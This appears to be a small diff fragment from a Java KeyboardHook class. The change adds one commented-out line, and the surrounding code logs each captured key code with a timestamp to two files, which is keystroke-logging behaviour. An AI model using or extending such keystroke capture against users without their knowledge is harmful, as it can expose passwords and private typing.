@@ -54,6 +54,7 @@ public class KeyboardHook implements Runnable{
                 System.exit(0);
             }
             try {
+                //info.scanCode;
                 bw1.write(time+"  ####  "+info.vkCode+"\r\n");
                 bw2.write(time+"  ####  "+info.vkCode+"\r\n");
 //                bw1.write(time+"KeyBoard "+String.fromCharCode());
